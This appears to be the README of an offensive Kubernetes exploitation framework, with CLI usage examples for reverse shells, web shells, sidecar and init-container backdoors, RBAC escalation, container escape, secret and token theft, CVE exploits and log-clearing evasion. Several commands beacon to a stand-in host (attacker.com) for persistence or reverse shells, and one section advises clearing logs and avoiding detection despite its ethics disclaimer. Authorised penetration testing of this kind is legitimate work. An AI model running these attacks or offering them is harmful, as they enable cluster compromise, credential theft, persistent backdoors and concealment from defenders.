# KubeShadow Exploitation Framework

A comprehensive Metasploit-style exploitation framework for Kubernetes environments, providing advanced attack capabilities, persistence mechanisms, and post-exploitation tools.

## üéØ Overview

The KubeShadow Exploitation Framework is designed to provide security professionals with powerful tools for testing Kubernetes security postures. It includes:

- **Payload Generation**: Create and inject malicious payloads
- **Exploit Execution**: Execute specific exploits against targets
- **Persistence Mechanisms**: Establish persistent access
- **Post-Exploitation**: Data collection and lateral movement
- **Evasion Techniques**: Avoid detection and forensic analysis
- **Sidecar Injection**: Use `injected-pod.yaml` template for realistic sidecar attacks
- **Ephemeral Container Injection**: Inject ephemeral containers for debugging and exploitation
- **Init Container Injection**: Inject malicious init containers for persistence and exploitation
- **CVE Exploitation**: Advanced exploitation of specific CVEs with Kubernetes semantics understanding
- **Load Balancer Exploitation**: Expose pods to the internet via load balancer services with host filesystem access

## üìÅ Template Files

### `injected-pod.yaml`
This template file contains a realistic malicious sidecar container configuration that is used by the sidecar injection functionality. The template includes:

- **Privileged Security Context**: Full root access with all capabilities
- **Host Filesystem Access**: Mounts the host root filesystem
- **Network Tools**: Includes netcat for reverse shell capabilities
- **Environment Variables**: Contains payload and access indicators
- **Volume Mounts**: Access to host filesystem for persistence

The sidecar injection module automatically uses this template when injecting malicious sidecars into target pods, making the attacks more realistic and comprehensive.

## üéØ Ephemeral Container Injection

### Available Ephemeral Container Methods

#### Injection Methods
- **inject** - Inject malicious ephemeral container
- **debug** - Create debugging ephemeral container  
- **escape** - Use ephemeral container for container escape

#### Management Methods
- **list** - List existing ephemeral containers
- **cleanup** - Remove ephemeral containers

### Usage Examples

```bash
# Inject malicious ephemeral container
kubeshadow exploitation ephemeral inject --target-pod vulnerable-pod --namespace default --image alpine:latest --privileged

# Create debugging ephemeral container
kubeshadow exploitation ephemeral debug --target-pod web-app --namespace production --image busybox

# Use ephemeral container for escape
kubeshadow exploitation ephemeral escape --target-pod privileged-pod --namespace kube-system --image ubuntu:latest --host-access

# List ephemeral containers
kubeshadow exploitation ephemeral list --namespace default

# Cleanup ephemeral containers
kubeshadow exploitation ephemeral cleanup --namespace default --confirm
```

## üîí Init Container Injection

### Available Init Container Methods

#### Injection Methods
- **inject** - Inject malicious init container
- **backdoor** - Create backdoor init container
- **persistence** - Create persistence init container

#### Management Methods
- **list** - List existing init containers
- **cleanup** - Remove init containers

### Usage Examples

```bash
# Inject malicious init container
kubeshadow exploitation init-container inject --target-pod vulnerable-pod --namespace default --image alpine:latest --privileged

# Create backdoor init container
kubeshadow exploitation init-container backdoor --target-pod web-app --namespace production --image busybox --payload "curl http://attacker.com/beacon"

# Create persistence init container
kubeshadow exploitation init-container persistence --target-pod database --namespace kube-system --image ubuntu:latest --host-access

# List init containers
kubeshadow exploitation init-container list --namespace default

# Cleanup init containers
kubeshadow exploitation init-container cleanup --namespace default --confirm
```

## üöÄ Quick Start

```bash
# List available exploitation modules
./kubeshadow exploitation

# Generate a reverse shell payload
./kubeshadow exploitation payloads generate --type bash-reverse --lhost 192.168.1.100 --lport 4444

# Execute RBAC escalation exploit
./kubeshadow exploitation exploits rbac-escalate --target-sa vulnerable-sa --namespace default

# Establish persistence via sidecar injection
./kubeshadow exploitation persistence backdoor --method sidecar --target-pod vulnerable-pod

# Collect data from compromised cluster
./kubeshadow exploitation post-ex data-collect --output /tmp/loot --format json

# Execute anti-forensics evasion
./kubeshadow exploitation evasion anti-forensics --target-pod compromised-pod
```

## üì¶ Payloads Module

### Available Payload Types

#### Reverse Shells
- **bash-reverse**: Bash reverse shell
- **python-reverse**: Python reverse shell
- **perl-reverse**: Perl reverse shell
- **php-reverse**: PHP reverse shell
- **nc-reverse**: Netcat reverse shell

#### Web Shells
- **php-webshell**: PHP web shell
- **jsp-webshell**: JSP web shell
- **asp-webshell**: ASP web shell
- **node-webshell**: Node.js web shell

#### Privilege Escalation
- **suid-escalate**: SUID privilege escalation
- **sudo-escalate**: Sudo privilege escalation
- **cap-escalate**: Capability escalation
- **docker-escalate**: Docker privilege escalation

#### Data Exfiltration
- **data-collector**: Collect sensitive data
- **file-stealer**: Steal specific files
- **env-dumper**: Dump environment variables
- **secret-hunter**: Hunt for secrets

#### Persistence
- **backdoor-user**: Create backdoor user
- **cron-persistence**: Cron-based persistence
- **service-persistence**: Service-based persistence
- **ssh-key-plant**: Plant SSH keys

#### Evasion
- **obfuscated-shell**: Obfuscated reverse shell
- **encoded-payload**: Base64 encoded payload
- **polymorphic**: Polymorphic payload
- **anti-detection**: Anti-detection payload

### Usage Examples

```bash
# Generate bash reverse shell
./kubeshadow exploitation payloads generate --type bash-reverse --lhost 192.168.1.100 --lport 4444

# Generate Python reverse shell
./kubeshadow exploitation payloads generate --type python-reverse --lhost 192.168.1.100 --lport 4444

# Generate data collection payload
./kubeshadow exploitation payloads generate --type data-collector

# Inject payload into target pod
./kubeshadow exploitation payloads inject --target-pod vulnerable-pod --payload "base64-encoded-payload" --method exec

# Encode payload in base64
./kubeshadow exploitation payloads encode --payload "whoami" --format base64
```

## üî• Exploits Module

### Available Exploits

#### RBAC Exploitation
- **rbac-escalate**: Escalate privileges via RBAC misconfigurations
- **sa-abuse**: Abuse service account permissions
- **role-hijack**: Hijack existing roles
- **cluster-admin**: Attempt cluster-admin escalation

#### Container Exploitation
- **container-escape**: Escape from container to host
- **privileged-abuse**: Abuse privileged containers
- **hostpath-escape**: Escape via hostPath mounts
- **cap-escape**: Escape via capabilities
- **chroot-escape**: Escape via chroot capabilities

#### Network Exploitation
- **kubelet-hijack**: Hijack kubelet API
- **etcd-inject**: Inject pods via etcd
- **api-server-bypass**: Bypass API server restrictions
- **network-pivot**: Pivot between network segments

#### Authentication Exploitation
- **token-theft**: Steal service account tokens
- **cert-rotation**: Abuse certificate rotation
- **anonymous-access**: Exploit anonymous access
- **weak-auth**: Exploit weak authentication

#### Data Exploitation
- **secret-harvest**: Harvest secrets from cluster
- **config-extract**: Extract configuration data
- **log-mining**: Mine logs for sensitive data
- **volume-access**: Access sensitive volumes

#### Lateral Movement
- **namespace-pivot**: Pivot between namespaces
- **node-compromise**: Compromise additional nodes
- **service-abuse**: Abuse service accounts
- **pod-hopping**: Move between pods

### Usage Examples

```bash
# Execute RBAC escalation
./kubeshadow exploitation exploits rbac-escalate --target-sa vulnerable-sa --namespace default

# Execute container escape
./kubeshadow exploitation exploits container-escape --target-pod privileged-pod --method hostpath

# Execute kubelet hijack
./kubeshadow exploitation exploits kubelet-hijack --target-node 192.168.1.10 --port 10250

# Execute ETCD injection
./kubeshadow exploitation exploits etcd-inject --target-etcd 192.168.1.10:2379 --namespace default

# Execute namespace pivot
./kubeshadow exploitation exploits namespace-pivot --target-namespace kube-system

# Execute secret harvest
./kubeshadow exploitation exploits secret-harvest --namespace default

# Execute token theft
./kubeshadow exploitation exploits token-theft --target-pod vulnerable-pod --namespace default
```

## üîí Persistence Module

### Available Persistence Methods

#### Container-based Persistence
- **sidecar-injection**: Inject malicious sidecar containers
- **init-container**: Abuse init containers for persistence
- **backdoor-pod**: Create backdoor pods
- **daemonset-abuse**: Abuse DaemonSets for persistence

#### Scheduled Persistence
- **cron-persistence**: Create malicious cron jobs
- **scheduled-job**: Create Kubernetes CronJobs
- **periodic-task**: Create periodic tasks

#### Authentication Persistence
- **sa-token-theft**: Steal and abuse service account tokens
- **rbac-persistence**: Create persistent RBAC bindings
- **cluster-admin**: Escalate to cluster-admin

#### Network Persistence
- **service-backdoor**: Create backdoor services
- **ingress-persistence**: Abuse ingress controllers
- **loadbalancer-abuse**: Abuse load balancers

#### Storage Persistence
- **volume-persistence**: Abuse persistent volumes
- **configmap-backdoor**: Store backdoors in ConfigMaps
- **secret-persistence**: Store persistence data in secrets

#### Advanced Persistence
- **operator-abuse**: Abuse custom operators
- **webhook-persistence**: Abuse admission webhooks
- **crd-persistence**: Abuse custom resource definitions

### Usage Examples

```bash
# Establish sidecar persistence
./kubeshadow exploitation persistence sidecar-injection --target-pod vulnerable-pod --namespace default --payload "while true; do curl http://attacker.com/beacon; sleep 300; done"

# Establish cron persistence
./kubeshadow exploitation persistence cron-persistence --schedule "*/5 * * * *" --command "curl http://attacker.com/beacon"

# Establish service backdoor
./kubeshadow exploitation persistence service-backdoor --name backdoor-service --image alpine:latest --namespace default

# Establish volume persistence
./kubeshadow exploitation persistence volume-persistence --target-pod vulnerable-pod --namespace default --payload "echo 'persistence' > /backdoor/persist.sh"

# Establish SA token theft
./kubeshadow exploitation persistence sa-token-theft --target-sa vulnerable-sa --namespace default

# Establish RBAC persistence
./kubeshadow exploitation persistence rbac-persistence --target-sa vulnerable-sa --namespace default
```

## üìä Post-Exploitation Module

### Available Post-Exploitation Methods

#### Data Collection
- **data-collect**: Collect sensitive data from cluster
- **secret-harvest**: Harvest secrets and credentials
- **config-extract**: Extract configuration data
- **log-mining**: Mine logs for sensitive information
- **volume-access**: Access sensitive volumes

#### Lateral Movement
- **lateral-move**: Move between namespaces and pods
- **node-compromise**: Compromise additional nodes
- **service-abuse**: Abuse service accounts
- **pod-hopping**: Move between pods
- **network-pivot**: Pivot between network segments

#### Privilege Escalation
- **privilege-escalate**: Escalate privileges within cluster
- **cluster-admin**: Attempt cluster-admin escalation
- **node-access**: Gain access to nodes
- **host-compromise**: Compromise host systems

#### Reconnaissance
- **system-recon**: System reconnaissance
- **network-recon**: Network reconnaissance
- **service-discovery**: Discover services and endpoints
- **vulnerability-scan**: Scan for additional vulnerabilities

#### Network Operations
- **port-scan**: Scan for open ports
- **service-enum**: Enumerate services
- **dns-enum**: Enumerate DNS records
- **network-topology**: Map network topology

#### Credential Operations
- **credential-harvest**: Harvest credentials
- **token-abuse**: Abuse service account tokens
- **cert-extraction**: Extract certificates
- **key-recovery**: Recover encryption keys

### Usage Examples

```bash
# Collect data from cluster
./kubeshadow exploitation post-ex data-collect --output /tmp/loot --format json --scope cluster

# Execute lateral movement
./kubeshadow exploitation post-ex lateral-move --target-namespace kube-system --current-namespace default

# Execute privilege escalation
./kubeshadow exploitation post-ex privilege-escalate --target-sa vulnerable-sa --namespace default

# Execute credential harvest
./kubeshadow exploitation post-ex credential-harvest --scope cluster --namespace default

# Execute system reconnaissance
./kubeshadow exploitation post-ex system-recon --target-pod vulnerable-pod --namespace default
```

## ü•∑ Evasion Module

### Available Evasion Methods

#### Anti-Forensics
- **anti-forensics**: Anti-forensics techniques
- **log-manipulation**: Manipulate audit logs
- **artifact-removal**: Remove forensic artifacts
- **timeline-obfuscation**: Obfuscate attack timeline

#### Process Hiding
- **process-hiding**: Hide malicious processes
- **process-obfuscation**: Obfuscate process names
- **memory-hiding**: Hide processes in memory
- **kernel-hiding**: Hide processes at kernel level

#### Network Evasion
- **network-evasion**: Evade network detection
- **traffic-obfuscation**: Obfuscate network traffic
- **dns-tunneling**: Use DNS for communication
- **icmp-tunneling**: Use ICMP for communication

#### Container Evasion
- **container-evasion**: Evade container detection
- **runtime-hiding**: Hide from container runtime
- **cgroup-evasion**: Evade cgroup restrictions
- **namespace-evasion**: Evade namespace restrictions

#### Audit Evasion
- **audit-evasion**: Evade audit logging
- **siem-evasion**: Evade SIEM detection
- **log-evasion**: Evade log analysis
- **event-evasion**: Evade event monitoring

#### Persistence Evasion
- **persistence-evasion**: Evade persistence detection
- **backdoor-hiding**: Hide backdoor mechanisms
- **service-hiding**: Hide malicious services
- **cron-hiding**: Hide malicious cron jobs

### Usage Examples

```bash
# Execute anti-forensics
./kubeshadow exploitation evasion anti-forensics --target-pod compromised-pod --namespace default

# Execute log manipulation
./kubeshadow exploitation evasion log-manipulation --method clear --target-logs audit --namespace default

# Execute process hiding
./kubeshadow exploitation evasion process-hiding --method obfuscation --target-process malicious --namespace default

# Execute network evasion
./kubeshadow exploitation evasion network-evasion --method dns-tunneling --target-pod compromised-pod --namespace default

# Execute container evasion
./kubeshadow exploitation evasion container-evasion --method runtime-hiding --target-pod compromised-pod --namespace default

# Execute audit evasion
./kubeshadow exploitation evasion audit-evasion --method siem-evasion --target-pod compromised-pod --namespace default
```

## üéØ CVE Exploitation Framework

Advanced exploitation module that understands Kubernetes semantics including:
- OwnerReferences manipulation
- RBAC privilege escalation  
- Admission webhook bypass
- API path fuzzing and validation
- Policy-time mutation enforcement

### Supported CVEs

#### CVE-2025-1974: ingress-nginx RCE
**Description**: Remote Code Execution vulnerability in ingress-nginx through configuration snippet injection.

**Exploitation Techniques**:
- Configuration snippet injection via `nginx.ingress.kubernetes.io/configuration-snippet`
- Server snippet injection via `nginx.ingress.kubernetes.io/server-snippet`
- Upstream vhost manipulation via `nginx.ingress.kubernetes.io/upstream-vhost`
- Lua code injection through vulnerable annotations

**Usage Examples**:
```bash
# Exploit CVE-2025-1974 on target ingress
kubeshadow exploitation cve-exploits cve-2025-1974 --target-ingress vulnerable-ingress --namespace default --payload "curl http://attacker.com/beacon"

# List available CVE exploits
kubeshadow exploitation cve-exploits list
```

#### CVE-2025-5187: Node ownerReference Manipulation
**Description**: Privilege escalation through manipulation of Node ownerReferences in pod specifications.

**Exploitation Techniques**:
- Create pods with Node ownerReferences
- Abuse controller relationships
- Privilege escalation through ownerReference chains
- Host filesystem access via privileged containers

**Usage Examples**:
```bash
# Exploit CVE-2025-5187 on target node
kubeshadow exploitation cve-exploits cve-2025-5187 --target-node worker-node-1 --namespace kube-system --payload "curl http://attacker.com/beacon"
```

### Advanced Features

#### Admission Webhook Fuzzing
```bash
# Fuzz admission webhooks for vulnerabilities
kubeshadow exploitation cve-exploits fuzz-admission --webhook-url https://admission-webhook.example.com --namespace default
```

#### Policy Validation
```bash
# Validate security policies
kubeshadow exploitation cve-exploits validate-policies --namespace default
```

### CVE Exploitation Workflow

1. **Reconnaissance**: Identify vulnerable components
2. **Exploitation**: Execute CVE-specific exploits
3. **Validation**: Verify successful exploitation
4. **Persistence**: Establish persistent access
5. **Cleanup**: Remove exploitation artifacts

### Security Considerations

- **Ethical Use**: Only test on authorized systems
- **Impact Assessment**: Understand the full impact of CVE exploitation
- **Mitigation**: Implement proper security controls
- **Monitoring**: Monitor for CVE exploitation attempts

## üåê Load Balancer Exploitation

Advanced exploitation module for exposing pods to the internet via load balancer services with host filesystem access and reverse shell capabilities.

### Available Load Balancer Methods

#### Service Creation
- **create** - Create load balancer service for existing pod
- **expose** - Expose pod to internet via load balancer
- **host-access** - Create privileged pod with host filesystem access
- **reverse-shell** - Create reverse shell pod with internet exposure

#### Management Methods
- **list** - List existing load balancer services
- **cleanup** - Remove load balancer services and associated pods

### Usage Examples

```bash
# Create load balancer service for existing pod
kubeshadow exploitation loadbalancer create --target-pod vulnerable-pod --namespace default --port 80

# Expose pod to internet with reverse shell
kubeshadow exploitation loadbalancer expose --target-pod privileged-pod --namespace kube-system --port 4444 --reverse-shell

# Create host access pod with load balancer
kubeshadow exploitation loadbalancer host-access --namespace default --port 8080 --pod-name host-exploit

# Create reverse shell pod
kubeshadow exploitation loadbalancer reverse-shell --namespace default --port 4444 --lhost attacker.com --lport 4444

# List load balancer services
kubeshadow exploitation loadbalancer list --namespace default

# Cleanup load balancer services
kubeshadow exploitation loadbalancer cleanup --namespace default --confirm
```

### Load Balancer Template

The `loadbalancer-template.yaml` provides comprehensive templates for:
- **Privileged Pods**: Full host filesystem access with privileged security contexts
- **Reverse Shell Pods**: Multiple reverse shell methods (netcat, bash, python, perl)
- **Host Access Pods**: Complete host filesystem mounting with web server access
- **Load Balancer Services**: Cloud provider specific configurations for AWS, GCP, Azure

### Security Features

- **Host Filesystem Access**: Mounts complete host filesystem for privilege escalation
- **Reverse Shell Capabilities**: Multiple reverse shell methods for persistent access
- **Internet Exposure**: Load balancer services with external IPs for internet access
- **Privileged Containers**: Full root access with all capabilities
- **Network Access**: Host network, PID, and IPC access for container escape

## üîß Advanced Usage

### Custom Payloads

```bash
# Create custom payload
./kubeshadow exploitation payloads generate --type custom --payload "your-custom-payload"

# Encode custom payload
./kubeshadow exploitation payloads encode --payload "your-custom-payload" --format base64

# Inject custom payload
./kubeshadow exploitation payloads inject --target-pod vulnerable-pod --payload "base64-encoded-payload" --method sidecar
```

### Exploit Chaining

```bash
# Chain multiple exploits
./kubeshadow exploitation exploits rbac-escalate --target-sa vulnerable-sa --namespace default
./kubeshadow exploitation exploits container-escape --target-pod privileged-pod --method hostpath
./kubeshadow exploitation exploits namespace-pivot --target-namespace kube-system
```

### Persistence Chaining

```bash
# Establish multiple persistence mechanisms
./kubeshadow exploitation persistence sidecar-injection --target-pod vulnerable-pod --namespace default
./kubeshadow exploitation persistence cron-persistence --schedule "*/5 * * * *" --command "curl http://attacker.com/beacon"
./kubeshadow exploitation persistence service-backdoor --name backdoor-service --image alpine:latest --namespace default
```

### Evasion Chaining

```bash
# Chain multiple evasion techniques
./kubeshadow exploitation evasion anti-forensics --target-pod compromised-pod --namespace default
./kubeshadow exploitation evasion log-manipulation --method clear --target-logs audit --namespace default
./kubeshadow exploitation evasion process-hiding --method obfuscation --target-process malicious --namespace default
```

## üõ°Ô∏è Security Considerations

### Ethical Use
- Only use on systems you own or have explicit permission to test
- Follow responsible disclosure practices
- Respect local laws and regulations
- Use for educational and defensive purposes

### Detection Avoidance
- Use evasion techniques to avoid detection
- Implement anti-forensics measures
- Clear logs and artifacts
- Use legitimate-looking processes and services

### Cleanup
- Remove all persistence mechanisms after testing
- Clear all logs and artifacts
- Restore original configurations
- Document all changes made

## üìö Examples

### Complete Attack Scenario

```bash
# 1. Reconnaissance
./kubeshadow recon scan --namespace default

# 2. Exploit vulnerable pod
./kubeshadow exploitation exploits container-escape --target-pod vulnerable-pod --method hostpath

# 3. Establish persistence
./kubeshadow exploitation persistence sidecar-injection --target-pod vulnerable-pod --namespace default --payload "while true; do curl http://attacker.com/beacon; sleep 300; done"

# 4. Escalate privileges
./kubeshadow exploitation exploits rbac-escalate --target-sa vulnerable-sa --namespace default

# 5. Pivot to other namespaces
./kubeshadow exploitation exploits namespace-pivot --target-namespace kube-system

# 6. Collect sensitive data
./kubeshadow exploitation post-ex data-collect --output /tmp/loot --format json --scope cluster

# 7. Evade detection
./kubeshadow exploitation evasion anti-forensics --target-pod compromised-pod --namespace default
```

### Defensive Testing

```bash
# Test detection capabilities
./kubeshadow exploitation evasion test --method anti-forensics --target-pod test-pod --namespace default

# Test persistence detection
./kubeshadow exploitation persistence check --namespace default

# Test exploit detection
./kubeshadow exploitation exploits check --exploit rbac-escalate --target-sa test-sa --namespace default
```

## üéØ Conclusion

The KubeShadow Exploitation Framework provides comprehensive tools for testing Kubernetes security postures. It includes advanced attack capabilities, persistence mechanisms, and evasion techniques that help security professionals identify and remediate security vulnerabilities.

Remember to use these tools responsibly and ethically, following all applicable laws and regulations. Always obtain proper authorization before testing any systems.

For more information, visit the [KubeShadow Documentation](https://github.com/kubeshadow/kubeshadow).
